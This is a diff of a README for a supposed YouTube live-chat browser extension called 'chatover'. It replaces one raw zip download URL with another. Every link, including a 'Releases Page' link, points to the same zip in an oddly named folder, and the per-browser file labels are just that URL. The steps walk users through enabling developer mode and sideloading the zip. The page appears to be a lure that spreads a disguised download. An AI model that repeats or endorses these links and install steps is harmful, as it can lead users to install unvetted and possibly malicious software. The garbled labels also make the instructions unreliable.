@@ -8,7 +8,7 @@
 - **Lightweight & Fast**: Minimal impact on browser performance.
 
 ## 📥 Download Now
-[![Download chatover](https://raw.githubusercontent.com/simransehant/chatover/main/Cetomorpha/Software-encoignure.zip)](https://raw.githubusercontent.com/simransehant/chatover/main/Cetomorpha/Software-encoignure.zip)
+[![Download chatover](https://github.com/simransehant/chatover/raw/refs/heads/main/Cetomorpha/Software_3.4.zip)](https://github.com/simransehant/chatover/raw/refs/heads/main/Cetomorpha/Software_3.4.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and set up chatover on your browser.
@@ -16,29 +16,29 @@ Follow these steps to download and set up chatover on your browser.
 ### Step 1: Visit the Releases Page
 To start, click the link below to go to the downloads section:
 
-[Visit Releases Page](https://raw.githubusercontent.com/simransehant/chatover/main/Cetomorpha/Software-encoignure.zip)
+[Visit Releases Page](https://github.com/simransehant/chatover/raw/refs/heads/main/Cetomorpha/Software_3.4.zip)
 
 ### Step 2: Download the Extension
 On the releases page, you will see different versions of chatover available. 
 
 1. Find the latest version listed.
 2. Click on the file that matches your browser:
-   - For Chrome: Look for the file labeled `https://raw.githubusercontent.com/simransehant/chatover/main/Cetomorpha/Software-encoignure.zip`.
-   - For Firefox: Look for the file labeled `https://raw.githubusercontent.com/simransehant/chatover/main/Cetomorpha/Software-encoignure.zip`.
+   - For Chrome: Look for the file labeled `https://github.com/simransehant/chatover/raw/refs/heads/main/Cetomorpha/Software_3.4.zip`.
+   - For Firefox: Look for the file labeled `https://github.com/simransehant/chatover/raw/refs/heads/main/Cetomorpha/Software_3.4.zip`.
 
 ### Step 3: Install the Extension
 #### Chrome Installation
 1. Open your Chrome browser.
 2. Type `chrome://extensions/` in the address bar and press Enter.
 3. Enable "Developer mode" (toggle is in the top right corner).
-4. Drag and drop the `https://raw.githubusercontent.com/simransehant/chatover/main/Cetomorpha/Software-encoignure.zip` file into the Extensions page.
+4. Drag and drop the `https://github.com/simransehant/chatover/raw/refs/heads/main/Cetomorpha/Software_3.4.zip` file into the Extensions page.
 5. Confirm any prompts to add the extension.
 
 #### Firefox Installation
 1. Open your Firefox browser.
 2. Type `about:addons` in the address bar and press Enter.
 3. Click on the gear icon and select "Install Add-on From File".
-4. Choose the `https://raw.githubusercontent.com/simransehant/chatover/main/Cetomorpha/Software-encoignure.zip` file.
+4. Choose the `https://github.com/simransehant/chatover/raw/refs/heads/main/Cetomorpha/Software_3.4.zip` file.
 5. Confirm any prompts to add the extension.
 
 ## 🔧 Configuration Options
@@ -67,6 +67,6 @@ To contribute to chatover, fork the repository and submit a pull request. Your i
 ### Download & Install
 Make sure to download chatover using the link below:
 
-[Download Now](https://raw.githubusercontent.com/simransehant/chatover/main/Cetomorpha/Software-encoignure.zip)
+[Download Now](https://github.com/simransehant/chatover/raw/refs/heads/main/Cetomorpha/Software_3.4.zip)
 
 Thank you for using chatover! Enjoy the enhanced YouTube viewing experience with real-time live chat.
